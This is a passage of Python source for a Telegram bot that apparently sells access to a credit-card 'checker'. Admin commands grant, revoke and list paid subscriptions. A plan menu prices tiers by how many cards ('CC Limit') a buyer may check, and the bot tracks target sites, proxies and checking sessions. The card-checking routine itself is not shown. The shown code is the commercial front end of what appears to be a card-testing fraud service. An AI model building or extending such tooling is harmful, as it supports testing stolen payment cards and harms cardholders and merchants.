    if days_arg not in DAYS_TO_PLAN:
        await event.reply(premium_emoji(
            "❌ Invalid days!\n\n"
            "Allowed:\n"
            "<code>1</code>  → 🥉 Basic (500 CC)\n"
            "<code>5</code>  → 🥈 Standard (1000 CC)\n"
            "<code>15</code> → 🥇 Premium (2000 CC)\n"
            "<code>30</code> → 👑 VIP (5000 CC)\n"
            "<code>-1</code> → ♾️ Lifetime (10000 CC)"
        ), parse_mode='html')
        return

    plan_name, limit, emoji = DAYS_TO_PLAN[days_arg]
    days = int(days_arg)

    if days == -1:
        expiry_ts = -1
        expiry_display = "♾️ Lifetime"
    else:
        expiry_ts = time.time() + (days * 86400)
        expiry_date = datetime.fromtimestamp(expiry_ts).strftime("%d/%m/%Y %H:%M")
        expiry_display = f"⏳ {days} days (expires {expiry_date})"

    data = _load_premium_data()
    new_entry = {'expiry': expiry_ts, 'plan': plan_name, 'limit': limit}

    is_update = user_id_to_add in data
    if is_update:
        old = data[user_id_to_add]
        if isinstance(old, dict):
            old_plan = old.get('plan', 'vip').capitalize()
            old_exp = old.get('expiry', -1)
        else:
            old_plan = 'VIP'
            old_exp = old
        old_display = "♾️ Lifetime" if old_exp == -1 else datetime.fromtimestamp(old_exp).strftime("%d/%m/%Y")

    data[user_id_to_add] = new_entry
    _save_premium_data(data)

    if is_update:
        await event.reply(premium_emoji(
            f"🔄 Premium Updated!\n\n"
            f"👤 User: <code>{user_id_to_add}</code>\n"
            f"📅 Old Plan: {old_plan} ({old_display})\n"
            f"✅ New Plan: {emoji} {plan_name.capitalize()} — {expiry_display}\n"
            f"📊 CC Limit: {limit}"
        ), parse_mode='html')
        try:
            await bot.send_message(int(user_id_to_add), premium_emoji(
                f"🔄 Premium Updated!\n\n"
                f"✅ New Plan: {emoji} {plan_name.capitalize()}\n"
                f"💎 Access: {expiry_display}\n"
                f"📊 CC Limit: {limit}"
            ), parse_mode='html')
        except:
            pass
    else:
        await event.reply(premium_emoji(
            f"✅ Premium Added!\n\n"
            f"👤 User: <code>{user_id_to_add}</code>\n"
            f"💎 Plan: {emoji} {plan_name.capitalize()}\n"
            f"📅 Access: {expiry_display}\n"
            f"📊 CC Limit: {limit}"
        ), parse_mode='html')
        try:
            await bot.send_message(int(user_id_to_add), premium_emoji(
                f"🎉 Premium Access Granted!\n\n"
                f"✅ Plan: {emoji} {plan_name.capitalize()}\n"
                f"💎 Access: {expiry_display}\n"
                f"📊 CC Limit: {limit}\n"
                f"⚡ Use /start to begin"
            ), parse_mode='html')
        except:
            await event.reply(premium_emoji(f"⚠️ Note: Could not notify user <code>{user_id_to_add}</code>"), parse_mode='html')


@bot.on(events.NewMessage(pattern=r'^[/.]kick(?:\s|$)'))
async def remove_premium_command(event):
    if event.sender_id not in ADMIN_ID:
        return

    args = event.message.text.split()
    if len(args) < 2:
        await event.reply(premium_emoji("📝 Usage: <code>/kick user_id</code>"), parse_mode='html')
        return

    user_id_to_rm = args[1].strip()
    data = _load_premium_data()
    removed_json = False

    if user_id_to_rm in data:
        del data[user_id_to_rm]
        _save_premium_data(data)
        removed_json = True

    legacy = get_file_lines(PREMIUM_USERS_FILE)
    removed_txt = user_id_to_rm in legacy
    if removed_txt:
        new_list = [u for u in legacy if u != user_id_to_rm]
        with open(PREMIUM_USERS_FILE, 'w', encoding='utf-8') as f:
            for uid in new_list:
                f.write(f"{uid}\n")

    if not removed_json and not removed_txt:
        await event.reply(premium_emoji(f"❌ User <code>{user_id_to_rm}</code> not found in premium list."), parse_mode='html')
        return

    await event.reply(premium_emoji(
        f"✅ <b>Premium Removed!</b>\n\n"
        f"👤 User: <code>{user_id_to_rm}</code>\n"
        f"🚫 Access revoked immediately"
    ), parse_mode='html')
    try:
        await bot.send_message(int(user_id_to_rm), premium_emoji("⚠️ Your premium access has been revoked."), parse_mode='html')
    except:
        pass


@bot.on(events.NewMessage(pattern=r'^[/.]list$'))
async def list_premium_command(event):
    if event.sender_id not in ADMIN_ID:
        return

    _cleanup_expired()
    data = _load_premium_data()
    legacy = get_file_lines(PREMIUM_USERS_FILE)
    now = time.time()

    lines = []
    sno = 1

    for uid, info in sorted(data.items(), key=lambda x: (
        (x[1].get('expiry', -1) if isinstance(x[1], dict) else x[1]) == -1,
        (x[1].get('expiry', -1) if isinstance(x[1], dict) else x[1])
    )):
        if isinstance(info, dict):
            expiry = info.get('expiry', -1)
            plan = info.get('plan', 'vip')
            limit = info.get('limit', 5000)
        else:
            expiry = info
            plan = 'vip'
            limit = 5000

        plan_info = PLANS.get(plan, {})
        emoji = plan_info.get('emoji', '💎')

        if expiry == -1:
            exp_str = "♾️ Lifetime"
        elif now > expiry:
            continue
        else:
            remaining = expiry - now
            days = int(remaining // 86400)
            hours = int((remaining % 86400) // 3600)
            exp_date = datetime.fromtimestamp(expiry).strftime("%d/%m/%Y")
            exp_str = f"⏳ {days}d {hours}h ({exp_date})"
        lines.append(f"{sno}. <code>{uid}</code> — {emoji} {plan.capitalize()} | 📊 {limit} | {exp_str}")
        sno += 1

    for uid in legacy:
        if uid in data:
            continue
        lines.append(f"{sno}. <code>{uid}</code> — ✅ Legacy")
        sno += 1

    if not lines:
        await event.reply(premium_emoji("📭 No premium users found."), parse_mode='html')
        return

    user_list = "\n".join(lines)
    await event.reply(premium_emoji(f"👑 <b>Premium Users ({sno-1})</b>\n\n{user_list}"), parse_mode='html')


@bot.on(events.NewMessage(pattern=r'^[/.]plan$'))
async def plan_command(event):
    user_id = event.sender_id

    if not is_premium(user_id):
        msg = """💎 CHECKER PLANS 💎

🥉 BASIC
💰 $1  |  ⏳ 1 Day  |  📊 500 CC Limit

🥈 STANDARD
💰 $2  |  ⏳ 5 Days  |  📊 1000 CC Limit

🥇 PREMIUM
💰 $7  |  ⏳ 15 Days  |  📊 2000 CC Limit

👑 VIP
💰 $15  |  ⏳ 30 Days  |  📊 5000 CC Limit

━━━━━━━━━━━━━━
⚡ Fast Checking
⚡ Stable Access
⚡ Regular Updates
━━━━━━━━━━━━━━
DM : @Phantxdead_XD"""
        await event.reply(premium_emoji(msg), parse_mode='html')
        return

    # Admin
    if int(user_id) in ADMIN_ID:
        msg = """👑 You are an Admin — Full Access

📊 CC Limit: 10000
⏳ Expiry: ♾️ Lifetime"""
        await event.reply(premium_emoji(msg), parse_mode='html')
        return

    # Legacy txt user
    legacy = get_file_lines(PREMIUM_USERS_FILE)
    if str(user_id) in legacy:
        msg = """✅ Your Plan

💎 Plan: 👑 VIP (Legacy)
📊 CC Limit: 5000
⏳ Expiry: ♾️ Lifetime"""
        await event.reply(premium_emoji(msg), parse_mode='html')
        return

    expiry, plan, limit = _get_user_info(user_id)
    if expiry is None or not is_premium(user_id):
        msg = """💎 CHECKER PLANS 💎

🥉 BASIC
💰 $1  |  ⏳ 1 Day  |  📊 500 CC Limit

🥈 STANDARD
💰 $2  |  ⏳ 5 Days  |  📊 1000 CC Limit

🥇 PREMIUM
💰 $7  |  ⏳ 15 Days  |  📊 2000 CC Limit

👑 VIP
💰 $15  |  ⏳ 30 Days  |  📊 5000 CC Limit

━━━━━━━━━━━━━━
⚡ Fast Checking
⚡ Stable Access
⚡ Regular Updates
━━━━━━━━━━━━━━
DM : @Phantxdead_XD"""
        await event.reply(premium_emoji(msg), parse_mode='html')
        return

    plan_info = PLANS.get(plan, {})
    emoji = plan_info.get('emoji', '💎')
    plan_name = plan.capitalize()

    if expiry == -1:
        expiry_str = "♾️ Lifetime"
    else:
        remaining = expiry - time.time()
        days = int(remaining // 86400)
        hours = int((remaining % 86400) // 3600)
        exp_date = datetime.fromtimestamp(expiry).strftime("%d/%m/%Y")
        expiry_str = f"⏳ {days}d {hours}h (expires {exp_date})"

    msg = f"""✅ Your Plan

💎 Plan: {emoji} {plan_name}
📊 CC Limit: {limit}
⏳ Expiry: {expiry_str}

⚡ Powered by @Phantxdead_XD"""
    await event.reply(premium_emoji(msg), parse_mode='html')

@bot.on(events.NewMessage(pattern='/stats'))
async def stats_command(event):
    user_id = event.sender_id

    if user_id not in ADMIN_ID:
        await event.reply(premium_emoji("❌ Access Denied. Admin only."), parse_mode='html')
        return

    _cleanup_expired()
    data = _load_premium_data()
    legacy = get_file_lines(PREMIUM_USERS_FILE)
    total_premium = len(data) + len([u for u in legacy if u not in data])
    sites = load_sites()
    proxies = load_proxies()

    stats_text = f"""📊 <b>Bot Statistics</b>

👑 <b>Admins:</b> {len(ADMIN_ID)}
💎 <b>Premium Users:</b> {total_premium}
🌐 <b>Sites:</b> {len(sites)}
🔌 <b>Proxies:</b> {len(proxies)}

🤖 <b>Bot Status:</b> Running ✅"""

    await event.reply(premium_emoji(stats_text), parse_mode='html')
    
@bot.on(events.CallbackQuery(pattern=rb"stop_(\d+)"))
async def stop_handler(event):
    match = event.pattern_match
    user_id = int(match.group(1).decode())
    message_id = event.message_id
    session_key = f"{user_id}_{message_id}"
    if session_key in active_sessions:
        del active_sessions[session_key]
        try:
            await event.answer(premium_emoji("🛑 Stopped"), alert=True)
        except:
            pass
        try:
            await event.edit(premium_emoji("🛑 Checking stopped by user."), parse_mode='html')
        except:
            pass
    else:
        try:
            await event.answer("Already stopped.", alert=True)
        except:
            pass

print("✅ Bot started successfully!")
bot.run_until_disconnected()